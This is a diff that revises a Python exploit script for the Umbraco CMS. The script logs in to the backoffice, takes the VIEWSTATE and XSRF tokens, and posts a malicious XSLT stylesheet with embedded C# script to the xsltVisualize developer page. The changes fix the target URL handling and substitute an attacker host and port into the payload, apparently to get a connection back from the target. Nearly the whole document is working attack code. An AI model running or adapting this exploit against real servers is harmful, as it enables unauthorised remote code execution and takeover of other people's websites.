@@ -25,7 +25,6 @@ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
  </xsl:template> </xsl:stylesheet> '
 
-
 class Payload:
     def __init__(self, target, host, port, user, passw):
         self.target = target
@@ -34,37 +33,30 @@ class Payload:
         self.user = user
         self.passw = passw
 
-    def print_dict(self, dico):
-        print(dico.items());
-    
     def execute(self):
+        global payload
         print("Starting exploit...")
-        s = requests.session()
-        url_main = "http://" + self.host + "/umbraco/";
-        r1 = s.get(url_main);
-        print_dict(r1.cookies);
+        http_host = "http://" + self.target
         
-        print(r1)
-
-        url_login = "http://" + self.target + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
+        s = requests.session()
+        url_main = http_host +  "/umbraco/";
+        r1 = s.get(url_main);
+        
+        url_login = http_host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
         loginfo = {"username": self.user,"password": self.passw};
         r2 = s.post(url_login,json=loginfo);
         
-        print(r2)
+        payload = payload.replace("{host}", self.host).replace("{port}", self.port)
         
-        url_xslt = "http://" + self.host + "/umbraco/developer/Xslt/xsltVisualize.aspx";
+        url_xslt = http_host + "/umbraco/developer/Xslt/xsltVisualize.aspx";
         r3 = s.get(url_xslt);
-        print(r3)
-
+        
         soup = BeautifulSoup(r3.text, 'html.parser');
         VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
         VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
         UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
         headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
-        data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload.format(host=self.host,port=self.port),"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};
-        
-        print(data)
+        data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};
         
         r4 = s.post(url_xslt,data=data,headers=headers);
-        print(r4)
         print("Success")
